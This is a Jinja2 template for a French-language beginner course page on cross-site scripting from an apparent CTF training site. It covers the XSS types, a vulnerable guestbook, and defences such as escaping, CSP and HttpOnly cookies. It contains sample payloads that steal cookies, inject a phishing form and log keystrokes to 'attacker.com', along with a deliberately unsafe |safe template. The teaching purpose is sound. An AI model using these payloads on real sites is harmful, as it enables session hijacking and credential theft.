{% extends "base.html" %}
{% block title %}Cours : Cross-Site Scripting - CyberCampus CTF{% endblock %}

{% block content %}
<section class="page-wrapper course-page">
  
  <!-- Breadcrumb -->
  <div class="breadcrumb">
    <a href="{{ url_for('learn') }}">üìö Biblioth√®que</a>
    <span class="separator">/</span>
    <span class="current">Cross-Site Scripting</span>
  </div>

  <!-- En-t√™te du cours -->
  <div class="course-header">
    <div class="course-header-icon">üîó</div>
    <div class="course-header-content">
      <h1>Cross-Site Scripting (XSS)</h1>
      <p class="course-subtitle">Ma√Ætriser la s√©curit√© c√¥t√© client et l'√©chappement HTML</p>
      <div class="course-badges">
        <span class="badge-high">√âlev√©</span>
        <span class="badge-time">üìñ 12 min</span>
        <span class="badge-level">‚ö° D√©butant</span>
      </div>
    </div>
  </div>

  <!-- Contenu du cours -->
  <div class="course-content">

    <!-- Section 1 -->
    <div class="course-section">
      <h2>üîç Qu'est-ce que le Cross-Site Scripting ?</h2>
      <p>
        Le Cross-Site Scripting (XSS) est une vuln√©rabilit√© de s√©curit√© qui permet √† un attaquant d'<strong>injecter 
        du code JavaScript malveillant</strong> dans une page web consult√©e par d'autres utilisateurs. Ce code s'ex√©cute 
        alors dans le navigateur des victimes avec les m√™mes privil√®ges que le site l√©gitime.
      </p>
      <p>
        Contrairement aux injections SQL qui ciblent le serveur, les attaques XSS exploitent la confiance que les 
        utilisateurs accordent au site web. Le navigateur ne peut pas distinguer le code l√©gitime du code malveillant.
      </p>
      
      <div class="info-box">
        <div class="info-icon">üí°</div>
        <div class="info-content">
          <strong>Impact des attaques XSS :</strong>
          <p>Vol de cookies de session, redirection vers des sites malveillants, d√©facement de pages, 
          keylogging, phishing, et m√™me propagation de malware.</p>
        </div>
      </div>
    </div>

    <!-- Section 2 -->
    <div class="course-section">
      <h2>üìã Les trois types de XSS</h2>
      
      <div class="xss-types-detailed">
        <div class="xss-type-box reflected">
          <div class="type-header">
            <span class="type-icon">üîÑ</span>
            <h3>XSS R√©fl√©chi (Reflected XSS)</h3>
          </div>
          <p>
            Le code malveillant est <strong>imm√©diatement renvoy√©</strong> par le serveur dans sa r√©ponse. 
            L'attaque est g√©n√©ralement d√©livr√©e via un lien pi√©g√©.
          </p>
          <div class="example-box">
            <strong>Exemple :</strong>
            <code>https://site.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
            <p>Si le site affiche directement le param√®tre <code>q</code> sans l'√©chapper, le script s'ex√©cute.</p>
          </div>
        </div>

        <div class="xss-type-box stored">
          <div class="type-header">
            <span class="type-icon">üíæ</span>
            <h3>XSS Stock√© (Stored XSS)</h3>
          </div>
          <p>
            Le code malveillant est <strong>enregistr√© dans la base de donn√©es</strong> (commentaire, profil, message) 
            et ex√©cut√© √† chaque fois que la page est affich√©e. C'est le type le plus dangereux.
          </p>
          <div class="example-box">
            <strong>Exemple :</strong>
            <p>Un attaquant poste un commentaire contenant <code>&lt;script&gt;...&lt;/script&gt;</code>. 
            Chaque visiteur qui lit ce commentaire ex√©cute le code malveillant.</p>
          </div>
        </div>

        <div class="xss-type-box dom">
          <div class="type-header">
            <span class="type-icon">üé≠</span>
            <h3>XSS bas√© sur le DOM</h3>
          </div>
          <p>
            La vuln√©rabilit√© se trouve <strong>c√¥t√© client</strong>, dans le code JavaScript de la page. 
            Le serveur n'est pas impliqu√© dans l'attaque.
          </p>
          <div class="example-box">
            <strong>Exemple :</strong>
            <code>document.write("Hello " + location.hash.substring(1));</code>
            <p>Si l'URL contient <code>#&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, le script s'ex√©cute.</p>
          </div>
        </div>
      </div>
    </div>

    <!-- Section 3 -->
    <div class="course-section">
      <h2>‚öôÔ∏è Comment fonctionne une attaque XSS ?</h2>
      <p>Prenons l'exemple d'un livre d'or vuln√©rable :</p>
      
      <div class="code-block vulnerable">
        <div class="code-header">
          <span class="code-status">‚ùå Code vuln√©rable</span>
          <span class="code-lang">HTML / Jinja2</span>
        </div>
        <pre><code>&lt;div class="comments"&gt;
  {% raw %}{% for comment in comments %}{% endraw %}
    &lt;div class="comment"&gt;
      &lt;strong&gt;{% raw %}{{ comment.author }}{% endraw %}&lt;/strong&gt;
      &lt;p&gt;{% raw %}{{ comment.text|safe }}{% endraw %}&lt;/p&gt;  &lt;!-- DANGER : |safe d√©sactive l'√©chappement --&gt;
    &lt;/div&gt;
  {% raw %}{% endfor %}{% endraw %}
&lt;/div&gt;</code></pre>
      </div>

      <h3>Sc√©nario d'attaque :</h3>
      <p>Un attaquant soumet le commentaire suivant :</p>
      
      <div class="attack-showcase">
        <div class="attack-input">
          <label>Commentaire :</label>
          <code>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code>
        </div>
      </div>

      <p>Lorsque la page est affich√©e, le navigateur interpr√®te ce texte comme du code JavaScript et l'ex√©cute !</p>

      <h3>Attaques plus sophistiqu√©es :</h3>
      
      <div class="attack-types">
        <div class="attack-type-card">
          <h4>üç™ Vol de cookies</h4>
          <div class="code-snippet">
            <code>&lt;script&gt;
  fetch('http://attacker.com?cookie=' + document.cookie)
&lt;/script&gt;</code>
          </div>
          <p>L'attaquant r√©cup√®re le cookie de session et peut usurper l'identit√© de la victime.</p>
        </div>

        <div class="attack-type-card">
          <h4>üé£ Phishing</h4>
          <div class="code-snippet">
            <code>&lt;script&gt;
  document.body.innerHTML = '&lt;form action="http://attacker.com"&gt;...'
&lt;/script&gt;</code>
          </div>
          <p>Remplace la page par un faux formulaire de connexion pour voler les identifiants.</p>
        </div>

        <div class="attack-type-card">
          <h4>‚å®Ô∏è Keylogging</h4>
          <div class="code-snippet">
            <code>&lt;script&gt;
  document.addEventListener('keypress', e => {
    fetch('http://attacker.com?key=' + e.key)
  })
&lt;/script&gt;</code>
          </div>
          <p>Enregistre toutes les frappes clavier de l'utilisateur.</p>
        </div>
      </div>
    </div>

    <!-- Section 4 -->
    <div class="course-section">
      <h2>üõ°Ô∏è Comment se prot√©ger ?</h2>
      <p>La protection contre XSS repose sur plusieurs couches de d√©fense :</p>

      <div class="protection-method">
        <div class="method-number">1</div>
        <div class="method-content">
          <h3>√âchappement HTML syst√©matique</h3>
          <p>Convertissez tous les caract√®res sp√©ciaux HTML en entit√©s avant l'affichage :</p>
          
          <div class="code-block safe">
            <div class="code-header">
              <span class="code-status">‚úÖ Code s√©curis√©</span>
              <span class="code-lang">HTML / Jinja2</span>
            </div>
            <pre><code>&lt;div class="comment"&gt;
  &lt;strong&gt;{% raw %}{{ comment.author }}{% endraw %}&lt;/strong&gt;
  &lt;p&gt;{% raw %}{{ comment.text }}{% endraw %}&lt;/p&gt;  &lt;!-- √âchappement automatique par d√©faut --&gt;
&lt;/div&gt;</code></pre>
          </div>

          <div class="transformation-box">
            <div class="transform-before">
              <strong>Avant √©chappement :</strong>
              <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
            </div>
            <div class="transform-arrow">‚Üí</div>
            <div class="transform-after">
              <strong>Apr√®s √©chappement :</strong>
              <code>&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;</code>
            </div>
          </div>

          <p>Le navigateur affiche le texte tel quel au lieu de l'ex√©cuter comme du code.</p>
        </div>
      </div>

      <div class="protection-method">
        <div class="method-number">2</div>
        <div class="method-content">
          <h3>Content Security Policy (CSP)</h3>
          <p>D√©finissez une politique de s√©curit√© stricte via un header HTTP :</p>
          
          <div class="code-block safe">
            <div class="code-header">
              <span class="code-status">‚úÖ Configuration s√©curis√©e</span>
              <span class="code-lang">HTTP Header</span>
            </div>
            <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';</code></pre>
          </div>

          <p>Cette politique :</p>
          <ul>
            <li>N'autorise que les scripts du m√™me domaine (<code>'self'</code>)</li>
            <li>Bloque les scripts inline (<code>&lt;script&gt;...&lt;/script&gt;</code>)</li>
            <li>Interdit les plugins dangereux (Flash, etc.)</li>
          </ul>
        </div>
      </div>

      <div class="protection-method">
        <div class="method-number">3</div>
        <div class="method-content">
          <h3>Cookies HTTPOnly et Secure</h3>
          <p>Prot√©gez les cookies de session contre le vol via XSS :</p>
          
          <div class="code-block safe">
            <div class="code-header">
              <span class="code-status">‚úÖ Code s√©curis√©</span>
              <span class="code-lang">Python / Flask</span>
            </div>
            <pre><code>response.set_cookie(
    'session_id',
    value=session_token,
    httponly=True,  # Interdit l'acc√®s JavaScript au cookie
    secure=True,    # Uniquement transmis en HTTPS
    samesite='Lax'  # Protection CSRF
)</code></pre>
          </div>

          <div class="success-box">
            <strong>R√©sultat :</strong> M√™me si un attaquant injecte du code XSS, il ne pourra pas 
            lire le cookie avec <code>document.cookie</code>.
          </div>
        </div>
      </div>

      <div class="protection-method">
        <div class="method-number">4</div>
        <div class="method-content">
          <h3>Validation et filtrage des entr√©es</h3>
          <p>V√©rifiez toujours les donn√©es c√¥t√© serveur :</p>
          <ul>
            <li>D√©finissez une liste blanche de balises HTML autoris√©es si n√©cessaire</li>
            <li>Utilisez des biblioth√®ques de sanitization (Bleach, DOMPurify)</li>
            <li>Validez les formats attendus (email, URL, etc.)</li>
            <li>Limitez la longueur des champs</li>
          </ul>
        </div>
      </div>
    </div>

    <!-- Section 5 -->
    <div class="course-section">
      <h2>üìù R√©sum√© des bonnes pratiques</h2>
      <div class="checklist">
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span>√âchappez TOUJOURS le contenu utilisateur avant affichage</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span>N'utilisez jamais <code>|safe</code>, <code>innerHTML</code> ou <code>eval()</code> avec des donn√©es utilisateur</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span>Impl√©mentez une Content Security Policy (CSP)</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span>Marquez les cookies sensibles comme HTTPOnly et Secure</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span>Validez et filtrez les entr√©es c√¥t√© serveur</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span>Utilisez des frameworks modernes qui √©chappent par d√©faut</span>
        </div>
      </div>
    </div>

    <!-- CTA Challenge -->
    <div class="challenge-cta">
      <div class="cta-content">
        <h2>üéØ Pr√™t √† pratiquer ?</h2>
        <p>
          Maintenant que vous ma√Ætrisez les concepts XSS, mettez vos connaissances en pratique ! 
          Notre challenge vous propose d'exploiter une vuln√©rabilit√© XSS r√©fl√©chi dans un livre d'or.
        </p>
        <div class="cta-info">
          <div class="cta-detail">
            <span class="cta-icon">‚≠ê</span>
            <span><strong>120 points</strong></span>
          </div>
          <div class="cta-detail">
            <span class="cta-icon">üéì</span>
            <span>Niveau d√©butant</span>
          </div>
          <div class="cta-detail">
            <span class="cta-icon">‚è±Ô∏è</span>
            <span>10-20 minutes</span>
          </div>
        </div>
        <a href="{{ url_for('challenge_view', challenge_id=2) }}" class="btn challenge-btn-large">
          Acc√©der au challenge XSS Reflected
        </a>
      </div>
    </div>

    <!-- Navigation -->
    <div class="course-navigation">
      <a href="{{ url_for('learn_sqli') }}" class="nav-btn back">
        ‚Üê Cours pr√©c√©dent : SQLi
      </a>
      <a href="{{ url_for('learn') }}" class="nav-btn next">
        Retour √† la biblioth√®que ‚Üí
      </a>
    </div>

  </div>

</section>
{% endblock %}